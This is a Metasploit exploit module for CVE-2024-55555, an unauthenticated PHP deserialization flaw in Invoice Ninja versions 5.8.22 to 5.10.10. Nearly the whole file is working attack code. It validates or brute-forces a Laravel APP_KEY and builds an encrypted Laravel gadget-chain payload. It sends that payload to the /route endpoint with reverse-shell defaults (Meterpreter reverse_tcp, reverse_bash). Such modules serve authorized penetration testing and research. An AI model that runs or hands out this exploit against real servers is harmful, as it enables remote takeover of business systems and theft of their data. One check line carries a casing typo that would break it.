##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::LaravelCryptoKiller
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Invoice Ninja unauthenticated PHP Deserialization Vulnerability',
        'Description' => %q{
          Invoice Ninja is a free invoicing software for small businesses, based on the PHP framework Laravel.
          A Remote Code Execution vulnerability in Invoice Ninja (>= 5.8.22 <= 5.10.10) allows remote unauthenticated
          attackers to conduct PHP deserialization attacks via endpoint `/route/<hash>` which accepts a Laravel
          ciphered value which is unsafe unserialized, if an attacker has access to the APP_KEY.
          As it allows remote code execution, adversaries could exploit this flaw to execute arbitrary commands,
          potentially resulting in complete system compromise, data exfiltration, or unauthorized access
          to sensitive information.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Rémi Matasse', # SynActiv Research Team - discovery of the vulnerability
          'Mickaël Benassouli' # SynActiv Research Team - discovery of the vulnerability
        ],
        'References' => [
          ['CVE', '2024-55555'],
          ['URL', 'https://attackerkb.com/topics/QtMS7cIExH/cve-2024-55555'],
          ['URL', 'https://www.synacktiv.com/advisories/invoiceninja-unauthenticated-remote-command-execution-when-appkey-known']
        ],
        'DisclosureDate' => '2024-12-13',
        'Platform' => ['php', 'unix', 'linux'],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'PHP',
            {
              'Platform' => ['php'],
              'Arch' => ARCH_PHP,
              'Type' => :php,
              'DefaultOptions' => {
                'PAYLOAD' => 'php/meterpreter/reverse_tcp'
              }
            }
          ],
          [
            'Unix/Linux Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The invoiceninja endpoint URL.', '/' ]),
      OptString.new('APP_KEY', [ true, 'Laravel APP_KEY.', 'base64:RR++yx2rJ9kdxbdh3+AmbHLDQu+Q76i++co9Y8ybbno=']),
      OptPath.new('BRUTEFORCE', [false, 'File with a list of APP_KEYs, one per line for a bruteforce attack.', nil])
    ])
  end

  def execute_command(cmd, _opts = {})
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'route', cmd.to_s),
      'ctype' => 'application/x-www-form-urlencoded'
    })
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi!({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'login')
    })
    return CheckCode::Unknown('No valid response received from target.') unless res&.code == 200

    # check if target is running the Invoice Ninja platform
    # search for the Invoice Ninja X-APP-VERSION within the returned headers from the login page
    version_number = res.headers['X-APP-VERSION']
    return CheckCode::Safe('No Invoice Ninja platform found.') if version_number.nil?

    if Rex::Version.new(version_number).between?(Rex::Version.new('5.8.22'), Rex::Version.new('5.10.10'))
      return CheckCode::Appears("Invoice Ninja #{version_number}")
    end

    checkCode::Safe("Invoice Ninja #{version_number}")
  end

  def exploit
    # lets first check if decryption is successful with the APP_KEY by decrypting the XSRF_TOKEN inside the cookie.
    # option APP_KEY is either a single entry of a file with APP_KEYS using the [file:] identifier
    cipher_mode = 'AES-256-CBC'
    res = send_request_cgi!({
      'method' => 'GET',
      'ctype' => 'application/x-www-form-urlencoded',
      'uri' => normalize_uri(target_uri.path, 'login')
    })
    fail_with(Failure::Unknown, 'No valid response received from target.') unless res&.code == 200

    print_status('Lets check if the APP_KEY(s) is/are valid by decrypting the XSRF_TOKEN inside the cookie.')
    print_status('Grabbing the cookie with the XSRF-TOKEN.')
    set_cookie = res.get_cookies
    fail_with(Failure::NotFound, 'No cookie found.') if set_cookie.nil?
    xsrf_token = set_cookie.match(/XSRF-TOKEN=([^;]+)/)
    fail_with(Failure::NotFound, 'No XSRF-TOKEN found. Unable to check APP_KEY.') if xsrf_token.nil?

    if datastore['BRUTEFORCE']
      key_file = datastore['BRUTEFORCE']
      print_status("Starting bruteforce decryption with APP_KEYS listed in #{key_file}.")
      result = laravel_bruteforce_from_file(xsrf_token[1], key_file, cipher_mode)
      fail_with(Failure::NotFound, "Bruteforce decryption failed. No valid APP_KEY found in file #{key_file}.") if result.nil?
      valid_app_key = result['key']
      unciphered_value = result['value']
    else
      result = laravel_decrypt(xsrf_token[1], datastore['APP_KEY'], cipher_mode)
      fail_with(Failure::BadConfig, "Decryption with APP_KEY: #{datastore['APP_KEY']} failed.") if result.nil?
      valid_app_key = datastore['APP_KEY']
      unciphered_value = result
    end
    print_good("APP_KEY is valid: #{valid_app_key}")
    print_good("Unciphered value: #{unciphered_value}")

    print_status('Generate an encrypted serialization payload with our cracked APP_KEY.')
    pl = payload.encoded
    pl = "php -r \"#{payload.encoded.gsub('"', '\"').gsub('$', '\$')}\"" if target['Type'] == :php
    pl_len = pl.length
    laravel_payload = %(a:2:{i:7;O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"\x00*\x00events";O:35:"Illuminate\\Database\\DatabaseManager":2:{s:6:"\x00*\x00app";a:1:{s:6:"config";a:2:{s:16:"database.default";s:6:"system";s:20:"database.connections";a:1:{s:6:"system";a:1:{i:0;s:#{pl_len}:"#{pl}";}}}}s:13:"\x00*\x00extensions";a:1:{s:6:"system";s:12:"array_filter";}}}i:7;i:7;})
    b64_laravel_payload = Base64.strict_encode64(laravel_payload)
    laravel_cipher = laravel_encrypt(b64_laravel_payload, valid_app_key, cipher_mode)
    fail_with(Failure::BadConfig, 'Laravel encryption failed.') if laravel_cipher.nil?

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    execute_command(laravel_cipher)
  end
end
